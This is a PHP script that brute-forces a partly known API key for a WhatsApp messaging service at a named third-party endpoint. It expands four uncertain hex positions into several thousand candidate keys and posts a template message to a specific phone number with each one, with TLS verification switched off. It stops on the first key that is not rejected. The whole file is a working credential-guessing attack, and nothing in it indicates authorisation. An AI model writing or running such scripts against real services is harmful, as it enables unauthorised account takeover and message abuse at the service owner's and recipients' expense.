<?php
/**
 * Exact 32-character fuzzing script for Epsilon WhatsApp API Key
 */

$pos0_5 = "7d3a86";
$pos6 = "d";
$pos7 = "8";
$pos8 = "8";

// Choices for position 9
$pos9_choices = ["c", "0", "a", "8", "d", "9", "e", "f", "1", "7", "4"];

$pos10 = "9";
$pos11_19 = "feede7651";

// Choices for position 20
$pos20_choices = ["f", "4", "1", "7", "a", "d", "c", "0"];

$pos21_25 = "07b62";

// Choices for position 26
$pos26_choices = ["0", "d", "8", "a", "c", "e", "f", "9"];

$pos27_28 = "cb";

// Choices for position 29
$pos29_choices = ["1", "f", "7", "4", "d", "a", "0", "b"];

$pos30_31 = "a1";

$candidates = [];

foreach ($pos9_choices as $p9) {
    foreach ($pos20_choices as $p20) {
        foreach ($pos26_choices as $p26) {
            foreach ($pos29_choices as $p29) {
                $key = $pos0_5 . $pos6 . $pos7 . $pos8 . $p9 . $pos10 . $pos11_19 . $p20 . $pos21_25 . $p26 . $pos27_28 . $p29 . $pos30_31;
                if (strlen($key) === 32) {
                    $candidates[] = "epsilon_" . $key;
                }
            }
        }
    }
}

// De-duplicate
$candidates = array_unique($candidates);

echo "Generated " . count($candidates) . " unique candidate API keys.\n";

$api_url = "https://whatsapp.epsilon-technology.com/api/external/send-message";

// Payload
$payload = [
    "messaging_product" => "whatsapp",
    "to" => "919638249696",
    "type" => "template",
    "template" => [
        "name" => "contact_form",
        "language" => ["code" => "en_US"],
        "components" => [
            [
                "type" => "body",
                "parameters" => [
                    ["type" => "text", "text" => "Test"],
                    ["type" => "text", "text" => "Test"],
                    ["type" => "text", "text" => "Test"],
                    ["type" => "text", "text" => "Test"],
                    ["type" => "text", "text" => "Test"]
                ]
            ]
        ]
    ]
];
$json_payload = json_encode($payload);

foreach ($candidates as $index => $key) {
    // Print progress every 50 requests
    if ($index % 50 === 0) {
        echo "Trying candidates " . $index . " to " . min($index + 49, count($candidates) - 1) . "...\n";
    }

    $ch = curl_init($api_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $json_payload);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 2);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json",
        "x-api-key: " . $key
    ]);

    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code !== 403 || strpos($response, "Invalid API Key") === false) {
        echo "\nSUCCESS!!! Found key: $key\n";
        echo "HTTP Code: $http_code\n";
        echo "Response: $response\n";
        exit;
    }
}

echo "Done. No valid key found.\n";
